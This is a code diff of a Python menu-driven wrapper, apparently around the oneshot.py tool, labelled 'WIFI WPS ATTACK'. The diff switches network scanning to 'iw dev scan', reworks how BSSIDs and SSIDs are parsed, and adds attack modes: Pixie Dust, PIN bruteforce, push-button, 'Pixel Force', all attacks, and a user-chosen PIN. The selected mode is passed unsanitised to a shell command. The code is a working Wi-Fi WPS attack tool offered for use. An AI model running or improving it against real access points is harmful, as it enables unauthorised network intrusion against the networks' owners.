@@ -4,7 +4,7 @@
 
 
 
-#__-_-_-_-_-_+_-_-_-_+_+_+_+.  Colour 
+# Colour 
 
 class Colors:
     G = '\033[1;32m'   
@@ -72,53 +72,61 @@ def scan_networks(iface):
     print(f"\n{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.Y}")
     print(f"          {Colors.Y}{Colors.BOLD} WIFI WPS ATTACK BY ADITHYAN {Colors.Y}")
     print(f"{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.W}\n")
-   # print(" ")
-    print(f"\n[*] SCANNING WI-FI ON {iface} ...")
-    output = run_cmd(f"timeout 35s sudo python3 oneshot.py -i {iface} --reverse-scan 2>&1")
+    
+    print(f"\n[*] SCANNING WI-FI ON {iface} ....")
+    
+    output = run_cmd(f"timeout 15s sudo iw dev {iface} scan 2>&1")
 
     networks = []
     seen = set()
 
-    for line in output.splitlines():
-        bssid_match = re.search(r'([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})', line)
+    bss_blocks = re.split(r'BSS ', output)
+
+    for block in bss_blocks[1:]:
+        bssid_match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', block)
         if not bssid_match:
             continue
-        bssid = bssid_match.group(1)
+        bssid = bssid_match.group(1).upper()
         if bssid in seen:
             continue
         seen.add(bssid)
 
-        # ESSID my
         essid = "Hidden"
-        essid_match = re.search(r'\s+([^\s].*?)\s+(?:-\d+|\d+\s*dBm|Channel)', line)
+        essid_match = re.search(r'SSID:\s*(.+?)(?:\n|$)', block)
         if essid_match:
             essid = essid_match.group(1).strip()[:35]
 
-        # Security fm
-        security = "WPA/WPA2"
-        if re.search(r'WPS', line, re.IGNORECASE):
-            security = "WPA/WPS"
-        elif not re.search(r'WPA', line, re.IGNORECASE):
-            security = "Open?"
+        security = "Open"
+        if re.search(r'RSN|WPA2', block, re.IGNORECASE):
+            security = "WPA2"
+        elif re.search(r'WPA', block, re.IGNORECASE):
+            security = "WPA"
+        elif re.search(r'Privacy', block):
+            security = "WPS/A/WPA2"
 
         networks.append((bssid, essid, security))
 
+    print(f"[*] Found {len(networks)} networks")
     return networks
+    
+    
+    # selected network option
 
 def select_network(networks):
     clear()
     
     if not networks:
-   
         print("[!] No networks found.")
         return input("\nEnter target BSSID manually: ").strip()
 
-    print("\n" + "="*60)
-    print(f"{'#':<3} {'BSSID':<18} {'ESSID':<16} Security")
-    print("="*60)
+    print("\n" + "="*70)
+    print(f"{'#':<3} {'BSSID':<19} {'ESSID':<30} Security")
+    print("="*70)
+    
     for i, (bssid, essid, security) in enumerate(networks, 1):
-        print(f"{i:<3} {essid:<30} {security}")
-    print("="*60)
+        print(f"{i:<3} {bssid:<19} {essid:<30} {security}")
+    
+    print("="*70)
 
     while True:
         try:
@@ -142,24 +150,35 @@ def select_attack_mode():
    # print(" ")
     print(f"{Colors.R}{Colors.BOLD}[*] [ ATTACK MODE ]{Colors.R}\n")
    # print(" ")
+    
+    
+    
+
+
+    
+    
     print(f"{Colors.W}{Colors.BOLD} [1] Pixie Dust      (-K){Colors.W}")
+          
+  # print(" ")
+    print(" [2] Bruteforce      ")
+  # print(" ")
+    print(" [3] Push Button    ")
     
-  #  print(" ")
-    print(" [2] Bruteforce      (-B)")
-  #  print(" ")
-    print(" [3] Push Button    (-PBC)")
+    print(" [4] Pixel Force     ")
     
-    print(" [4] Pixel Force     (-F")
-    #print(" ")
-    print(" [5] Specific PIN    (-X)")
-  #  print(" ")
+    print(" [5] All Attack       ")
     
-    ch = input("\nChoose (1-5): ").strip()
+  # print(" ")
+    print(" [6] Specific PIN    ")
+  # print(" ")
+    
+    ch = input("\nChoose (1-6): ").strip()
     if ch == "1": return "-K"
     if ch == "2": return "-B"
     if ch == "3": return "--pbc"
     if ch == "4": return "-F"
-    if ch == "5":
+    if ch == "5": return " "
+    if ch == "6":
         pin = input("Enter PIN: ").strip()
         return f"-p {pin}"
     return "-K"
@@ -193,7 +212,7 @@ def main():
    # print(
 
     try:
-        #clear()
+        clear()
         subprocess.run(cmd, shell=True)
     except KeyboardInterrupt:
         print("\nStopped.")
